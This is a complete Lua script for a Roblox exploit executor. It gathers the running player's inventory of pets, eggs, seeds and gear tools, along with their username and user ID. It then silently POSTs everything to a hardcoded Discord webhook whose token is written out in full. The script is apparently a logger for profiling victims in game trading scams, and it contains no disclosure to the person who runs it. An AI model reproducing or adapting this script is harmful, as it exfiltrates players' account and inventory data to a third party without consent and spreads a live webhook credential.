local webhook = "https://discord.com/api/webhooks/1382134335238443090/XCkrCU6atsiZi4PecJDz0MbWyH_XN-sm1J-UDsh2h_4SNT4s1pJ4gsUqa5ptaXh2pEOx"

local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

local function debug(msg)
    pcall(function()
        game.StarterGui:SetCore("ChatMakeSystemMessage", { Text = "[DEBUG] " .. msg })
    end)
end

-- Collect inventory
local allItems = {}
local function gatherItems(container)
    for _, tool in ipairs(container:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(allItems, tool.Name)
        end
    end
end

gatherItems(player.Backpack)
gatherItems(player.Character or player.CharacterAdded:Wait())

-- Categorize inventory
local function formatItems(items)
    local result = {}
    for _, name in ipairs(items) do
        local count = string.match(name, "%[x(%d+)%]") or "1"
        local cleanName = name:gsub("%[x%d+%]%s*", ""):gsub("^%s*(.-)%s*$", "%1")
        table.insert(result, string.format("[x%s] %s", count, cleanName))
    end
    return result
end

local function filterItems(keywordList)
    local filtered = {}
    for _, item in ipairs(allItems) do
        for _, keyword in ipairs(keywordList) do
            if string.lower(item):find(keyword) then
                table.insert(filtered, item)
                break
            end
        end
    end
    return formatItems(filtered)
end

local petsEquipped = {} -- We'll populate this later if needed
local pets = filterItems({ "age" })
local eggs = filterItems({ "egg" })
local seeds = filterItems({ "seed" })
local gears = filterItems({ "sprinkler", "staff", "rod" })

-- Construct message
local function codeBlock(list)
    if #list == 0 then return "```\nNone\n```" end
    return "```\n   " .. table.concat(list, "\n‎ ‎ ‎ ‎") .. "\n```"
end

local message = {
    content = nil,
    username = player.Name,
    avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=100&height=100&format=png",
    embeds = { {
        title = "**" .. player.Name .. "**",
        description = "_ _\n**🪙 Sheckles  **: 213b\n_ _\n_ _\n**🎒 | Inventory**\n_ _\n_ _",
        color = 2750290,
        fields = {
            {
                name = "> 🐶 | Pets Equipped",
                value = codeBlock(petsEquipped),
                inline = false
            },
            {
                name = "> 🥚 | Pets & Eggs",
                value = codeBlock(eggs) .. "\n" .. codeBlock(pets),
                inline = false
            },
            {
                name = "> 🔧 | Gears",
                value = codeBlock(gears),
                inline = false
            },
            {
                name = "> 🌱 | Seeds",
                value = codeBlock(seeds),
                inline = false
            }
        },
        footer = {
            text = "User: " .. player.Name .. " | ID: " .. player.UserId
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

local req = (syn and syn.request) or (http and http.request) or request
if req then
    req({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(message)
    })
    debug("✅ Webhook sent!")
else
    debug("❌ HTTP requests not supported.")
end
